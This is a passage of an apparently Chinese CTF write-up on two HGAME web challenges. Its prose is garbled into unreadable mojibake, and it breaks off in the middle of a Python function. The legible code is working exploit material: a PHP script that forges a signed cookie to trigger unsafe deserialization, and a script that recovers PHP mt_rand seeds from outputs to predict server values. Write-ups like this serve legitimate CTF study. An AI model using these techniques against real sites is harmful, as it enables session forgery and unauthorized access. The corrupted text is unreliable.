¼å¼åŒ–å­—ç¬¦ä¸²å†™å…¥å˜é‡ä¸­,ç¬¬ä¸€æ¬¡å¾ªç¯<code>$playername</code>æœ‰å€¼ï¼Œåˆ™å°†å€¼å†™å…¥%sï¼Œå¾ªç¯ç»“æŸï¼Œå¦‚æœå¾ªç¯çš„æ˜¯%såˆ™è¿›å…¥ä¸‹ä¸€æ¬¡å¾ªç¯ã€‚æ‰€ä»¥æ‰€è°“çš„<code>$encryptkey</code>å¯ä»¥ç›´æ¥å¾—åˆ°ã€‚è¾“å…¥åå­—ä¸º%så³å¯ã€‚<br>è¿™ç‚¹æ˜¯éƒå¸ˆå‚…æåˆ°ï¼Œddctf2019 webç­¾åˆ°ä¸­å‡ºç°è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢ä¸€éƒ¨åˆ†ä¹Ÿè·Ÿé‚£é“é¢˜æœ‰å…³ï¼Œæ‰€ä»¥æˆ‘æ‰èƒ½ç»•è¿‡è¿™ç‚¹ã€‚<br><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="key"><br>æ¥ç€æ³¨æ„åˆ°ä¸‹é¢,åœ¨å¾ªç¯è¿‡åï¼Œæˆ‘ä»¬çš„å¾ªç¯ç»“æœ<code>$value</code>ç»è¿‡äº†ä¸€æ¬¡MD5,ç”¨äºmonsterçš„å®ä¾‹åŒ–äº†ã€‚é‚£ä¹ˆè·Ÿè¿›monsterç±»ï¼Œå‘ç°é‡è¦ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$monsterData = base64_decode($_COOKIE[<span class="string">'monster'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(strlen($monsterData) &gt; <span class="number">32</span>)&#123;</span><br><span class="line">            $sign = substr($monsterData, <span class="number">-32</span>);</span><br><span class="line">            $monsterData = substr($monsterData, <span class="number">0</span>, strlen($monsterData) - <span class="number">32</span>);</span><br><span class="line">            <span class="keyword">if</span>(md5($monsterData . <span class="keyword">$this</span>-&gt;encryptKey) === $sign)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;monsterData = unserialize($monsterData);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                session_start();</span><br><span class="line">                session_destroy();</span><br><span class="line">                setcookie(<span class="string">'monster'</span>, <span class="string">''</span>);</span><br><span class="line">                header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>åŸæ¥monsteræ˜¯ä½œä¸ºcookieè¢«å­˜å‚¨èµ·æ¥çš„ï¼Œä¸”åªè¦æˆ‘ä»¬çš„monstercookieæ»¡è¶³æ¡ä»¶ï¼Œå°±æœ‰ä¸€ä¸ªååºåˆ—åŒ–åˆ©ç”¨ã€‚æ‰€ä»¥å…³æ³¨ä¸‹monosterçš„cookieçš„å­˜å‚¨æ–¹å¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">Save</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $sign = md5(serialize(<span class="keyword">$this</span>-&gt;monsterData) . <span class="keyword">$this</span>-&gt;encryptKey);</span><br><span class="line">        setcookie(<span class="string">'monster'</span>, base64_encode(serialize(<span class="keyword">$this</span>-&gt;monsterData) . $sign));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>äº†è§£åˆ°åŠ å¯†æ–¹å¼ï¼Œå°±æ˜ç™½äº†æˆ‘ä»¬çš„ååºåˆ—åŒ–ç”Ÿæ•ˆæ–¹æ³•äº†ï¼šæˆ‘ä»¬è¾“å…¥åå­—åï¼Œä¼ªé€ cookieï¼Œä»è€Œæ‰§è¡Œååºåˆ—åŒ–ä½¿Rankç±»ä¸­çš„<code>$rank</code>ä¸º1ï¼Œæ‹¿åˆ°flagã€‚<br>æ‰€ä»¥expå¦‚ä¸‹ï¼Œæ³¨æ„monsterç±»ä¸­çš„<code>$encryptley</code>ä¸æ˜¯Gameç±»ä¸­çš„çš„keyã€‚è€Œæ˜¯ç»è¿‡åå­—foreachååˆmd5äº†ä¸€ä¸‹ï¼Œä¼ è¿›Monsterç±»ä¸­çš„ï¼›å¦å¤–Rankç±»ä¸­çš„<code>_destruct()</code>ä¹Ÿè¦ç»•è¿‡å•Šã€‚æˆ‘ç›´æ¥æŠŠdestructç±»æ‰”æ‰åå¿˜è®°æ”¹<code>_construct()</code>hh</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rank</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $rank = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> $serverKey;</span><br><span class="line">    <span class="keyword">private</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = &amp;<span class="keyword">$this</span>-&gt;serverKey;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Game_encryptKey = <span class="string">'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL'</span>;</span><br><span class="line">$Game_data = [<span class="string">'byc_404'</span>, $Game_encryptKey];</span><br><span class="line">$Monster_encryptKey = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">foreach</span>($Game_data <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line">    $Monster_encryptKey .= md5($Monster_encryptKey . $value);</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Rank();</span><br><span class="line">$sign = md5(serialize($a) . $Monster_encryptKey);</span><br><span class="line">$cookie = base64_encode(serialize($a) . $sign);</span><br><span class="line"><span class="keyword">echo</span> $cookie;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><h1 id="äºŒå‘å…¥é­‚ï¼"><a href="#äºŒå‘å…¥é­‚ï¼" class="headerlink" title="äºŒå‘å…¥é­‚ï¼"></a>äºŒå‘å…¥é­‚ï¼</h1><p>æœ‰ä¸€è¯´ä¸€ï¼Œè™½ç„¶è¿™é¢˜ç¬¬11ä¸ªåšå‡ºæ¥æŒºé«˜å…´çš„ï¼Œä½†æ˜¯åŸºæœ¬æ²¡å•¥æ”¶è·ã€‚é¢˜ç›®æè¿°ä¹Ÿä¸æ¸…æ¥šï¼Œæ¼æ´åˆ©ç”¨æœ‰ç‚¹é¸¡è‚‹ï¼Œåšé¢˜æ—¶å®Œå…¨åŒ–èº«è„šæœ¬å°å­ã€‚æ€»è€Œè¨€ä¹‹ä¸çŸ¥é“å‡ºé¢˜äººçš„æ„å›¾æ˜¯å•¥ï¼Œwebé¢˜ä¸è¯¥æ˜¯è¿™ç§ç±»å‹çš„å§ã€‚</p><p>é¦–å…ˆåˆ¤æ–­æ¼æ´ç±»å‹ã€‚è¿›å…¥é¡µé¢å‘ç°æŠ½å¡æ•°ä¸cdkeyè¿™ä¸¤ä¸ªæäº¤æ¡†ã€‚æŠ½å¡æ—¶ä¼šå‡ºç°ä¸€å¤§ä¸²éšæœºæ•°ã€‚cdkeyæ²¡è¯´æ˜è¦æäº¤å•¥ã€‚æäº¤æ—¶ä¼šè¯´æ˜å€¼é”™è¯¯æˆ–è€…æ…¢äº2sã€‚<br>æ‰“å¼€æºç å‘ç°æç¤ºphp5ï¼Œå¯ä»¥è”æƒ³åˆ°æ˜¯php5ä¼ªéšæœºæ•°æ¼æ´(å®é™…ä¸Šå„ä¸ªç‰ˆæœ¬çš„phpéƒ½æœ‰è¿™ä¸€æ¼æ´ï¼Œåªä¸è¿‡5ä¸7æœ‰åŒºåˆ«)ã€‚ä¹‹å‰åœ¨GWCTFä¸Šæ›¾ç»ä½œä¸ºwebç­¾åˆ°é¢˜åšè¿‡ï¼Œæ˜¯å…³äº<code>mt_rand()</code>è¿™ä¸€å‡½æ•°çš„ã€‚<br>æ¼æ´å³åœ¨äºéšæœºæ•°é’Ÿå­è®¾å®šæ—¶ï¼Œäº§ç”Ÿçš„éšæœºæ•°åºåˆ—æ˜¯å›ºå®šçš„ã€‚æ•…å¯ä»¥æ ¹æ®éšæœºæ•°åºåˆ—å€’æ¨ç§å­æˆ–è€…æ ¹æ®ç§å­å»æ¨éšæœºæ•°åºåˆ—ã€‚å¸¸å¸¸ç”¨ä»¥ä¸‹ä»£ç æµ‹è¯•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mt_srand(123);</span><br><span class="line">for($i&#x3D;0;$i&lt;3;$i++)&#123;</span><br><span class="line"> echo mt_rand().&quot; &quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…·ä½“ç ´è§£æ–¹æ³•ä¸»è¦é å·¥å…·ï¼Œå³<code>php_mt_seed</code>ï¼Œä¼°è®°éƒ½ç”¨è¿‡ã€‚å¯ä»¥æ ¹æ®ä¸€ä¸ªæ•°å€’æ¨å‡ºå„ä¸ªphpç‰ˆæœ¬ä¸‹çš„éšæœºæ•°ç§å­ã€‚ä½†æ˜¯é—®é¢˜åœ¨äºé¢˜ç›®çš„ç§å­æ˜¾ç„¶æ˜¯åŠ¨æ€æ›´æ–°çš„ï¼Œä¸”åŸºæœ¬ä¸è¶…è¿‡2sã€‚ç›¸æ¯”GWCTFåªè·Ÿsessionæœ‰å…³çš„é™æ€ç§å­ï¼Œæœ¬é¢˜çš„æ›´æ–°é€Ÿåº¦è¿«ä½¿æˆ‘ä»¬åªèƒ½é è„šæœ¬è§£å†³ã€‚<br>æœæ–­ä¸Šgoogleæ‰¾ç›¸å…³æ–‡ç« ï¼Œè¿™ç¯‡æ–‡ç« å¸å¼•åˆ°æˆ‘çš„æ³¨æ„ï¼š<a href="https://www.ambionics.io/blog/php-mt-rand-prediction" target="_blank" rel="noopener">https://www.ambionics.io/blog/php-mt-rand-prediction</a><br>æ–‡ç« çš„å‰¯æ ‡é¢˜è¯´æ˜ï¼Œå¯ä»¥åªé€šè¿‡ä¸¤ä¸ªå€¼ä¸”å¹¶éæš´åŠ›ç ´è§£çš„æ–¹å¼å¾—åˆ°ç§å­ã€‚äºæ˜¯è¯»äº†ä¸‹æ–‡ç« ï¼Œå‘ç°è¯»ä¸æ‡‚ï¼Œçº¯ç®—æ³•å±‚é¢ã€‚å¥½åœ¨ç»™å‡ºäº†è„šæœ¬<br><a href="https://github.com/ambionics/mt_rand-reverse" target="_blank" rel="noopener">https://github.com/ambionics/mt_rand-reverse</a><br>åŠä½¿ç”¨æ–¹æ³•<br><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="è„šæœ¬"><br>é‡Œé¢ä¸€ä¸ªphpè„šæœ¬ç”¨äºç”Ÿæˆéšæœºæ•°ï¼Œå…¶ä¸­ä¸¤ä¸ªå‚æ•°ä¸€ä¸ªä¸ºç§å­ï¼Œå¦ä¸€ä¸ªä¸ºåç§»é‡ï¼Œå¦‚æœ<code>offset</code>è®¾ä¸º0ï¼Œåˆ™è¾“å‡ºçš„æ˜¯ä»¥è¾“å…¥ç§å­ç”Ÿæˆçš„ç¬¬1ä¸ªå’Œç¬¬228ä¸ªéšæœºæ•°ï¼›pythonè„šæœ¬ç”¨äºè§£éšæœºæ•°ï¼Œå…±å››ä¸ªå‚æ•°ï¼Œå‰é¢phpè„šæœ¬ç”Ÿæˆçš„ä¸¤ä¸ªéšæœºæ•°ï¼Œä¸€ä¸ªåç§»é‡åŒä¸Šï¼ŒåŠ ä¸Šä¸€ä¸ªå€¼ä¸º0/1çš„ç”¨äºåˆ¤åˆ«phpç‰ˆæœ¬çš„å‚æ•°ã€‚0ä¸ºphp5,1ä¸ºphp7</p><p>æ‰€ä»¥æˆ‘å°è¯•æ‹¿æœ¬åœ°çš„ä¸€ç»„æ•°æ®åœ¨è™šæ‹Ÿæœºé‡Œè¯•ä¸‹ï¼Œå‘ç°å¾ˆå¿«èƒ½æ‹¿åˆ°ç»“æœç§å­123ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 reverse_mt_rand.py   644748169  126568735  0   0</span><br></pre></td></tr></table></figure><p>å¯èƒ½å°±æ˜¯æˆ‘è¦çš„è„šæœ¬ã€‚<br>æ‰€ä»¥æ€è·¯å¦‚ä¸‹ï¼Œåœ¨è„šæœ¬ä¸­ç»™æŠ½å¡æ¬¡æ•°ä¼ ä¸º228ï¼Œè·å–ç¬¬ä¸€ä¸ªå’Œç¬¬227ä¸ªéšæœºæ•°ï¼Œä¼ ç»™è„šæœ¬ï¼Œå¦ä¸¤ä¸ªå‚æ•°ç›´æ¥è®¾ä¸º<code>0 0</code>æ‰§è¡Œï¼Œç»“æœå¼€å§‹ç¿»è½¦ã€‚ä¸»è¦æ˜¯è‡ªå·±ä¸ç†Ÿæ‚‰osåº“å§ï¼Œæƒ³è¦ç›´æ¥åœ¨ä¸€ä¸ªè„šæœ¬é‡Œè°ƒç”¨å¦ä¸€ä¸ªè„šæœ¬ï¼Œè™½ç„¶ç»“æœæ˜¯å¯¹çš„ä½†å°±æ˜¯æ‹¿ä¸åˆ°flagã€‚äºæ˜¯ç›´æ¥æ”¹è¿™ä¸ªè§£å¯†è„šæœ¬<br>(ä¸»è¦æ˜¯æŠŠ<code>main()</code>æ”¹æˆè¿”å›intå€¼,åŸæœ¬æ˜¯ç›´æ¥<code>print</code>çš„)ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">time_start=time.time()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://twoshot.hgame.n3ko.co/random.php?times=228'</span></span><br><span class="line">url1 = <span class="string">'https://twoshot.hgame.n3ko.co/verify.php'</span></span><br><span class="line">s = requests.session()</span><br><span class="line">res = s.get(url)</span><br><span class="line">key = res.text</span><br><span class="line">key = key.replace(<span class="string">'['</span>, <span class="string">''</span>)</span><br><span class="line">key = key.replace(<span class="string">']'</span>, <span class="string">','</span>)</span><br><span class="line">ans = re.findall(<span class="string">r'(.*?)\,'</span>, key)</span><br><span class="line">arg1=ans[<span class="number">0</span>]</span><br><span class="line">arg2=ans[<span class="number">227</span>]</span><br><span class="line">print(arg1)</span><br><span class="line">print(arg2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä»¥ä¸‹ä¸ºåŸè„šæœ¬</span></span><br><span class="line">N = <span class="number">624</span></span><br><span class="line">M = <span class="number">397</span></span><br><span class="line"></span><br><span class="line">MAX = <span class="number">0xffffffff</span></span><br><span class="line">MOD = MAX + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># STATE_MULT * STATE_MULT_INV = 1 (mod MOD)</span></span><br><span class="line">STATE_MULT = <span class="number">1812433253</span></span><br><span class="line">STATE_MULT_INV = <span class="number">2520285293</span></span><br><span class="line"></span><br><span class="line">MT_RAND_MT19937 = <span class="number">1</span></span><br><span class="line">MT_RAND_PHP = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_initialize</span><span class="params">(seed)</span>:</span></span><br><span class="line">    <span class="string">"""Creates the initial state array from a seed.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    state = [<span class="literal">None</span>] * N</span><br><span class="line">    state[<span class="number">0</span>] = seed &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N):</span><br><span class="line">        r = state[i - <span class="number">1</span>]</span><br><span class="line">        state[i] = (STATE_MULT * (r ^ (r &gt;&gt; <span class="number">30</span>)) + i) &amp; MAX</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_initialize</span><span class="params">(s, p)</span>:</span></span><br><span class="line">    <span class="string">"""From an initial state value `s` at position `p`, find out seed.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># We have:</span></span><br><span class="line">    <span class="comment"># state[i] = (1812433253U * ( state[i-1] ^ (state[i-1] &gt;&gt; 30) + i )) % 100000000</span></span><br><span class="line">    <span class="comment"># and:</span></span><br><span class="line">    <span class="comment"># (2520285293 * 1812433253) % 100000000 = 1 (Modular mult. inverse)</span></span><br><span class="line">    <span class="comment"># =&gt; 2520285293 * (state[i] - i) = ( state[i-1] ^ (state[i-1] &gt;&gt; 30) ) (mod 100000000)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(p, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">        s = _undo_php_mt_initialize(s, i)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_undo_php_mt_initialize</span><span class="params">(s, i)</span>:</span></span><br><span class="line">    s = (STATE_MULT_INV * (s - i)) &amp; MAX</span><br><span class="line">    <span class="keyword">return</span> s ^ s &gt;&gt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_rand</span><span class="params">(s1)</span>:</span></span><br><span class="line">    <span class="string">"""Converts a merged state value `s1` into a random value, then sent to the</span></span><br><span class="line"><span class="string">    user.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_rand</span><span class="params">(s1)</span>:</span></span><br><span class="line">    <span class="string">"""Retrieves the merged state value from the value sent to the user.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line"></span><br><span class="line">    s1 = undo_lshift_xor_mask(s1, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line"></span><br><span class="line">    s1 ^= s1 &gt;&gt; <span class="number">11</span></span><br><span class="line">    s1 ^= s1 &gt;&gt; <span class="number">22</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_lshift_xor_mask</span><span class="params">(v, shift, mask)</span>:</span></span><br><span class="line">    <span class="string">"""r s.t. v = r ^ ((r &lt;&lt; shift) &amp; mask)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(shift, <span class="number">32</span>, shift):</span><br><span class="line">        v ^= (bits(v, i - shift, shift) &amp; bits(mask, i, shift)) &lt;&lt; i</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bits</span><span class="params">(v, start, size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> lobits(v &gt;&gt; start, size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lobits</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> v &amp; ((<span class="number">1</span> &lt;&lt; b) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> v &amp; (<span class="number">1</span> &lt;&lt; b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bv</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bit(v, b) &gt;&gt; b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_reload</span><span class="params">(state, flavour)</span>:</span></span><br><span class="line">    s = state</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, N - M):</span><br><span class="line">        s[i] = _twist_php(s[i + M], s[i], s[i + <span class="number">1</span>], flavour)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N - M, N - <span class="number">1</span>):</span><br><span class="line">        s[i] = _twist_php(s[i + M - N], s[i], s[i + <span class="number">1</span>], flavour)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_twist_php</span><span class="params">(m, u, v, flavour)</span>:</span></span><br><span class="line">    <span class="string">"""Emulates the `twist` and `twist_php` #defines.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span> <span class="keyword">if</span> (u <span class="keyword">if</span> flavour == MT_RAND_PHP <span class="keyword">else</span> v) &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> m ^ (((u &amp; <span class="number">0x80000000</span>) | (v &amp; <span class="number">0x7FFFFFFF</span>)) &gt;&gt; <span class="number">1</span>) ^ mask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_reload</span><span class="params">(S000, S227, offset, flavour)</span>:</span></span><br><span class="line">    <span class="comment"># define twist_php(m,u,v)  (m ^ (mixBits(u,v)&gt;&gt;1) ^ ((uint32_t)(-(int32_t)(loBit(u))) &amp; 0x9908b0dfU))</span></span><br><span class="line">    <span class="comment"># m S000</span></span><br><span class="line">    <span class="comment"># u S227</span></span><br><span class="line">    <span class="comment"># v S228</span></span><br><span class="line">    X = S000 ^ S227</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This means the mask was applied, and as such that S227's LSB is 1</span></span><br><span class="line">    s22X_0 = bv(X, 